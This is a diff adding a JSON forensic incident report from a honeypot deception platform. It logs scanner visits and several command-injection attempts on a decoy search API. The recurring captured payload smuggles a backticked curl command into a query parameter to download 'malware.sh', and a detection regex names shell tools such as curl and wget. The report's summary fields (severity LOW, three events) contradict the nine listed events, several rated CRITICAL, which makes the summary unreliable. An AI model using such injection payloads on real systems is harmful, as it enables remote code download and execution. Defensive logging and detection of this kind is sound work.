@@ -1,0 +1,221 @@
+{
+  "platform": "HONEYTRACE Active Deception Platform",
+  "report_type": "FORENSIC_INCIDENT_REPORT",
+  "generated_at": "2026-11-09T02:11:05.696334",
+  "incident_id": "INC-202611090206-127001",
+  "attacker_ip": "127.0.0.1",
+  "severity": "LOW",
+  "peak_risk_score": 35.0,
+  "event_count": 3,
+  "first_seen": "2026-11-09T02:06:43.078737",
+  "last_seen": "2026-11-09T02:11:02.321470",
+  "status": "OPEN",
+  "summary": "Adversary from 127.0.0.1 engaged HTTP with 3 distinct malicious interaction(s). Observed MITRE Tactics: [Reconnaissance]. Assessed Threat Level: LOW (Peak Risk Score: 35.0/100). Progression observed across 1 technique vector(s). (Note: All interactions isolated on deception sensors; zero host system compromise).",
+  "attack_vectors": [
+    "HTTP:AUTOMATED_SCANNER_UA"
+  ],
+  "mitre_tactics": [
+    "Reconnaissance"
+  ],
+  "compromise_assessment": "ATTEMPT_CAPTURED_NO_COMPROMISE (Decoy Trapped - Non-Executed)",
+  "recommended_defensive_actions": [
+    "1. Perimeter Defense: Enforce immediate firewall drop rule / fail2ban jail for source IP 127.0.0.1.",
+    "2. Identity & Access: Lock targeted accounts, enforce Multi-Factor Authentication (MFA), and audit active sessions.",
+    "3. Application Hardening: Enforce parameterized queries (OWASP A03) and strict path canonicalization for file APIs.",
+    "4. Non-Compromise Containment: Host assets safe. Maintain decoy honeypot monitoring to gather lateral movement telemetry."
+  ],
+  "correlated_events": [
+    {
+      "id": 518,
+      "event_uuid": "EVT-20261109021103-3B11DE73",
+      "timestamp": "2026-11-09T02:11:03.863646",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "SUSPICIOUS_COMMAND_PATTERN",
+      "detection_explanation": "Observed suspicious command pattern '`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`' in payload/endpoint. Indicates adversary attempting command execution or reverse shell injection. (Note: Telemetry captured on decoy honeypot; command strictly non-executed, host safe).",
+      "evidence": {
+        "matched_pattern": "(?i)(`.*(whoami|id|cat|curl|wget).*`)",
+        "matched_fragment": "`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`",
+        "raw_payload": "`curl -O http://127.0.0.1/malware.sh`",
+        "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    },
+    {
+      "id": 485,
+      "event_uuid": "EVT-20261109021102-CBEE5EBC",
+      "timestamp": "2026-11-09T02:11:02.230767",
+      "source_ip": "127.0.0.1",
+      "source_port": 60729,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "PORTAL_VISIT",
+      "endpoint": "/",
+      "risk_score": 35.0,
+      "severity": "LOW",
+      "rule_name": "AUTOMATED_SCANNER_UA",
+      "detection_explanation": "Automated scanner User-Agent header 'python-requests/2.34.2' identified.",
+      "evidence": {
+        "user_agent": "python-requests/2.34.2",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "GET / Homepage"
+    },
+    {
+      "id": 452,
+      "event_uuid": "EVT-20261109020754-6C1CC8CF",
+      "timestamp": "2026-11-09T02:07:54.911573",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "SUSPICIOUS_COMMAND_PATTERN",
+      "detection_explanation": "Observed suspicious command pattern '`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`' in payload/endpoint. Indicates adversary attempting command execution or reverse shell injection. (Note: Telemetry captured on decoy honeypot; command strictly non-executed, host safe).",
+      "evidence": {
+        "matched_pattern": "(?i)(`.*(whoami|id|cat|curl|wget).*`)",
+        "matched_fragment": "`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`",
+        "raw_payload": "`curl -O http://127.0.0.1/malware.sh`",
+        "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    },
+    {
+      "id": 419,
+      "event_uuid": "EVT-20261109020753-C40B4D90",
+      "timestamp": "2026-11-09T02:07:53.288059",
+      "source_ip": "127.0.0.1",
+      "source_port": 27764,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "PORTAL_VISIT",
+      "endpoint": "/",
+      "risk_score": 35.0,
+      "severity": "LOW",
+      "rule_name": "AUTOMATED_SCANNER_UA",
+      "detection_explanation": "Automated scanner User-Agent header 'python-requests/2.34.2' identified.",
+      "evidence": {
+        "user_agent": "python-requests/2.34.2",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "GET / Homepage"
+    },
+    {
+      "id": 405,
+      "event_uuid": "EVT-20261109020644-C32BB855",
+      "timestamp": "2026-11-09T02:06:44.729451",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "SUSPICIOUS_COMMAND_PATTERN",
+      "detection_explanation": "Observed suspicious command pattern '`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`' in payload/endpoint. Indicates adversary attempting command execution or reverse shell injection. (Note: Telemetry captured on decoy honeypot; command strictly non-executed, host safe).",
+      "evidence": {
+        "matched_pattern": "(?i)(`.*(whoami|id|cat|curl|wget).*`)",
+        "matched_fragment": "`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`",
+        "raw_payload": "`curl -O http://127.0.0.1/malware.sh`",
+        "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    },
+    {
+      "id": 372,
+      "event_uuid": "EVT-20261109020642-DC6960E3",
+      "timestamp": "2026-11-09T02:06:42.975211",
+      "source_ip": "127.0.0.1",
+      "source_port": 50698,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "PORTAL_VISIT",
+      "endpoint": "/",
+      "risk_score": 35.0,
+      "severity": "LOW",
+      "rule_name": "AUTOMATED_SCANNER_UA",
+      "detection_explanation": "Automated scanner User-Agent header 'python-requests/2.34.2' identified.",
+      "evidence": {
+        "user_agent": "python-requests/2.34.2",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "GET / Homepage"
+    },
+    {
+      "id": 339,
+      "event_uuid": "EVT-20261109020443-8258FA72",
+      "timestamp": "2026-11-09T02:04:43.584018",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "SUSPICIOUS_COMMAND_PATTERN",
+      "detection_explanation": "Observed suspicious command pattern '`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`' in payload/endpoint. Indicates adversary attempting command execution or reverse shell injection. (Note: Telemetry captured on decoy honeypot; command strictly non-executed, host safe).",
+      "evidence": {
+        "matched_pattern": "(?i)(`.*(whoami|id|cat|curl|wget).*`)",
+        "matched_fragment": "`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`",
+        "raw_payload": "`curl -O http://127.0.0.1/malware.sh`",
+        "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    },
+    {
+      "id": 293,
+      "event_uuid": "EVT-20261109020328-C7AB7F27",
+      "timestamp": "2026-11-09T02:03:28.495232",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "SUSPICIOUS_COMMAND_PATTERN",
+      "detection_explanation": "Observed suspicious command pattern '`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`' in payload/endpoint. Indicates adversary attempting command execution or reverse shell injection. (Note: Telemetry captured on decoy honeypot; command strictly non-executed, host safe).",
+      "evidence": {
+        "matched_pattern": "(?i)(`.*(whoami|id|cat|curl|wget).*`)",
+        "matched_fragment": "`curl -O http://127.0.0.1/malware.sh` `curl -O http://127.0.0.1/malware.sh`",
+        "raw_payload": "`curl -O http://127.0.0.1/malware.sh`",
+        "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+        "compromise_status": "ATTEMPT_CAPTURED_NO_COMPROMISE"
+      },
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    },
+    {
+      "id": 95,
+      "event_uuid": "EVT-20261109012145-25841245",
+      "timestamp": "2026-11-09T01:21:45.017986",
+      "source_ip": "172.16.8.99",
+      "source_port": 53004,
+      "honeypot_type": "HTTP",
+      "protocol": "HTTP",
+      "event_type": "COMMAND_INJECTION",
+      "endpoint": "/api/v1/search?q=`curl -O http://127.0.0.1/malware.sh`",
+      "risk_score": 100.0,
+      "severity": "CRITICAL",
+      "rule_name": "COMMAND_INJECTION",
+      "detection_explanation": "",
+      "evidence": {},
+      "payload_sample": "`curl -O http://127.0.0.1/malware.sh`"
+    }
+  ]
+}
